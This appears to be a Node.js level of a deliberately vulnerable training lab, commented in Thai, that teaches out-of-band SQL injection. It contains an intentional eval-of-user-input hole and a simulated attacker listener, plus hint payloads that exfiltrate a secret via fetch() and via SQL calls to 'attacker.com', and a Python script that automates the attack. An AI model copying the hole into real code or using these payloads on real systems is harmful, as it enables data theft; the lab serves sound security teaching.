/**
 * LEVEL 09 - OUT-OF-BAND (OOB) SQL INJECTION
 * ความยาก: ★★★★★★★★★☆
 *
 * จุดอ่อน: ไม่มี output, ไม่มี true/false, ไม่มี time delay
 *          แต่ระบบ "โทรออก" ไปยัง external server เมื่อ query สำเร็จ
 *          ข้อมูลถูกส่งออกผ่าน DNS lookup / HTTP request แอบๆ
 * กลไกการป้องกัน: ดูเหมือนปลอดภัยทุกด้าน — ไม่มี feedback ใดๆ กลับมา
 * วิธีผ่าน: ตั้ง listener รับ DNS/HTTP แล้วฝัง payload ที่ทำให้ server "โทรหา" เรา
 *
 * ✅ สามารถรันเป็น standalone ได้: node lab/levels/level09.js
 * 🚀 Port: 8109
 */

const express = require("express");
const http = require("http");
const router = express.Router();

const SECRET_FLAG = "FLAG{oob_sqli_09_exfil_master}";

// จำลอง OOB listener (รับ callback จาก "DB" ในเครื่องเดียวกัน)
const OOB_LISTENER_PORT = 8199;
const oobLog = []; // เก็บ request ที่เข้ามาที่ OOB listener

// ── OOB Listener Server (จำลอง attacker's server) ──────────────────
const oobApp = express();
oobApp.get("/oob", (req, res) => {
  const data = req.query.data || "";
  const ts = new Date().toISOString();
  oobLog.push({ ts, data, ip: req.ip });
  console.log(`[OOB RECEIVED] ${ts} → data=${data}`);
  res.send("OK");
});
oobApp.listen(OOB_LISTENER_PORT, () => {
  console.log(
    `🔊 OOB Listener running at http://localhost:${OOB_LISTENER_PORT}/oob`,
  );
});

// ── Helper: จำลอง DB ที่ทำ HTTP request ออกได้ ─────────────────────
function simulateOOBQuery(payload) {
  return new Promise((resolve) => {
    try {
      // ❌ จุดอ่อน: eval payload ที่รับมาโดยตรง
      // ใน SQL จริง: SELECT load_file(CONCAT('\\\\',secret,'.attacker.com\\x'))
      // ที่นี่: จำลองด้วย eval ที่เรียก HTTP callback ได้
      const result = eval(`
        (function() {
          const secret = "${SECRET_FLAG}";
          try {
            return (${payload});
          } catch(e) {
            return null;
          }
        })()
      `);

      // ถ้า payload สั่งให้ทำ HTTP request → resolve ทันที
      // (HTTP request จะไป oobLog เอง async)
      resolve({ ok: true });
    } catch (e) {
      resolve({ ok: false });
    }
  });
}

// ── Routes ─────────────────────────────────────────────────────────

// endpoint หลัก — ตอบ OK เสมอ ไม่มี feedback ใดๆ
router.get("/track", async (req, res) => {
  const pixel = req.query.pixel || "";

  await simulateOOBQuery(pixel);

  // ไม่มีข้อมูลอะไรกลับไปเลย
  // ส่ง 1x1 transparent GIF กลับ (เหมือน tracking pixel)
  const gif1x1 = Buffer.from(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
    "base64",
  );
  res.setHeader("Content-Type", "image/gif");
  res.setHeader("Cache-Control", "no-store");
  res.send(gif1x1);
});

// endpoint ดู OOB log (จำลอง attacker's dashboard)
router.get("/oob-dashboard", (req, res) => {
  const rows = oobLog
    .slice()
    .reverse()
    .map(
      (e) => `
      <tr>
        <td style="padding:6px 12px;border-bottom:1px solid #333;">${e.ts}</td>
        <td style="padding:6px 12px;border-bottom:1px solid #333;color:#4ec9b0;word-break:break-all;">${decodeURIComponent(e.data)}</td>
      </tr>`,
    )
    .join("");

  res.send(`
    <html>
    <head><title>OOB Dashboard</title></head>
    <body style="background:#1e1e1e;color:#d4d4d4;max-width:750px;margin:40px auto;font-family:monospace;">
      <h2>📡 OOB Listener Dashboard</h2>
      <p style="color:#888;">รับที่ <code>http://localhost:${OOB_LISTENER_PORT}/oob?data=...</code></p>
      <p>รับมาแล้ว <strong style="color:#ce9178;">${oobLog.length}</strong> requests</p>
      <table style="width:100%;border-collapse:collapse;font-size:0.85em;">
        <tr style="background:#2d2d2d;">
          <th style="padding:8px 12px;text-align:left;">Timestamp</th>
          <th style="padding:8px 12px;text-align:left;">Exfiltrated Data</th>
        </tr>
        ${rows || '<tr><td colspan="2" style="padding:12px;color:#888;">ยังไม่มีข้อมูล — รอ payload...</td></tr>'}
      </table>
      <br>
      <button onclick="location.reload()" style="padding:8px 16px;background:#0e639c;color:#fff;border:none;cursor:pointer;border-radius:4px;">🔄 Refresh</button>
      <a href="/" style="margin-left:12px;">← หน้าหลัก</a>
    </body>
    </html>
  `);
});

router.get("/", (req, res) => {
  res.send(`
    <html>
    <head><title>Level 09 - Out-of-Band SQL Injection</title></head>
    <body style="max-width:650px;margin:50px auto;font-family:monospace;">
      <h1>📡 LEVEL 09</h1>
      <h3>Out-of-Band (OOB) SQL Injection</h3>
      <hr>

      <p>ระบบนี้มี tracking pixel endpoint — ตอบกลับเป็นแค่รูป 1×1px</p>
      <p>ไม่มี output, ไม่มี error, ไม่มี delay — <strong>ไม่มีอะไรกลับมาเลย</strong></p>
      <p>แต่ถ้าคุณรู้จัก <em>Out-of-Band channel</em>...</p>

      <h4>🖼️ Tracking Pixel Endpoint:</h4>
      <code style="background:#f5f5f5;padding:8px;display:block;border-radius:4px;">
        GET /track?pixel=&lt;payload&gt;
      </code>

      <div style="margin:20px 0;">
        <p>ทดสอบ payload:</p>
        <input id="payload" type="text" placeholder="ใส่ payload ที่นี่"
          style="padding:8px;width:80%;box-sizing:border-box;">
        <button onclick="sendPixel()" style="padding:8px 16px;">ส่ง</button>
        <div id="result" style="margin-top:8px;font-size:0.85em;color:#888;"></div>
      </div>

      <div style="background:#fff3cd;padding:15px;border-radius:4px;margin:20px 0;">
        <strong>Hint:</strong> ใน MySQL จริง: <code>SELECT ... INTO OUTFILE '\\\\\\\\attacker.com\\\\share'</code><br>
        ที่นี่จำลองด้วย HTTP callback:<br>
        <code>fetch('http://localhost:${OOB_LISTENER_PORT}/oob?data='+secret)</code><br><br>
        <strong>เป้าหมาย:</strong> ให้ server ส่ง flag ออกมาที่ OOB listener ของคุณ
      </div>

      <div style="background:#f8d7da;padding:15px;border-radius:4px;margin:20px 0;">
        <strong>Challenge:</strong> ดู OOB requests ที่เข้ามาได้ที่<br>
        <a href="/oob-dashboard">📡 OOB Dashboard →</a>
      </div>

      <details style="margin-top:10px;">
        <summary style="cursor:pointer;font-weight:bold;">💡 Payload ตัวอย่าง</summary>
        <pre style="background:#1e1e1e;color:#d4d4d4;padding:15px;border-radius:4px;overflow-x:auto;margin-top:10px;">
// ❌ ไม่ได้ผล — ไม่มีอะไรกลับมาให้เห็น
1

// ✅ OOB exfiltration — ส่งข้อมูลออกทาง HTTP
fetch('http://localhost:${OOB_LISTENER_PORT}/oob?data='+encodeURIComponent(secret))

// ✅ ส่งแบบ async (ไม่บล็อก)
(async()=>{ await fetch('http://localhost:${OOB_LISTENER_PORT}/oob?data='+encodeURIComponent(secret)); return true; })()

// ✅ ดึงทีละ chunk (ถ้าข้อมูลยาว)
fetch('http://localhost:${OOB_LISTENER_PORT}/oob?data='+encodeURIComponent(secret.substring(0,20)))
        </pre>

        <details style="margin-top:10px;">
          <summary style="cursor:pointer;">🐍 Python automation script</summary>
          <pre style="background:#1e1e1e;color:#d4d4d4;padding:15px;border-radius:4px;overflow-x:auto;margin-top:8px;">
import requests, time, json

TARGET = "http://localhost:8109/track"
OOB_DASHBOARD = "http://localhost:8109/oob-dashboard"

# ส่ง OOB payload
payload = "fetch('http://localhost:${OOB_LISTENER_PORT}/oob?data='+encodeURIComponent(secret))"
requests.get(TARGET, params={"pixel": payload})

# รอ async request
time.sleep(1)

# ดึงผลจาก dashboard
r = requests.get("http://localhost:${OOB_LISTENER_PORT}/oob", params={"data": ""})
print("[*] ดู OOB Dashboard ที่:", OOB_DASHBOARD)
          </pre>
        </details>
      </details>

      <script>
        async function sendPixel() {
          const payload = document.getElementById("payload").value;
          const result = document.getElementById("result");
          result.textContent = "⏳ ส่ง...";
          const start = Date.now();
          await fetch("/track?pixel=" + encodeURIComponent(payload));
          const ms = Date.now() - start;
          result.textContent = "✅ ส่งแล้ว (" + ms + "ms) — ตรวจสอบ OOB Dashboard";
        }
      </script>
    </body>
    </html>
  `);
});

// ✅ Standalone Server
if (require.main === module) {
  const app = express();
  app.use("/", router);

  const PORT = 8109;
  app.listen(PORT, () => {
    console.log("\n=========================================");
    console.log("📡 LEVEL 09 - Out-of-Band SQL Injection");
    console.log("=========================================");
    console.log(`✅ RUNNING at:      http://localhost:${PORT}`);
    console.log(
      `🔊 OOB Listener at: http://localhost:${OOB_LISTENER_PORT}/oob`,
    );
    console.log(`📊 OOB Dashboard:   http://localhost:${PORT}/oob-dashboard`);
    console.log(
      `💡 วิธีผ่าน: ส่ง fetch() payload ให้ server โทรหา OOB listener`,
    );
    console.log("=========================================\n");
  });
}

module.exports = {
  router,
  info: {
    level: 9,
    port: 8109,
    name: "Out-of-Band (OOB) SQL Injection",
    vulnerability: "Data exfiltration via out-of-band HTTP/DNS channel",
    difficulty: 9,
    exploit_hint:
      "ส่ง payload: fetch('http://localhost:8199/oob?data='+encodeURIComponent(secret)) แล้วดูที่ OOB Dashboard",
    mitigation:
      "ปิดกั้น outbound network จาก DB server, ใช้ firewall rules, Prepared Statements",
    solution:
      "ใช้ HTTP callback exfiltration — ให้ server ส่งข้อมูลมาหา listener ของเราเอง",
  },
};
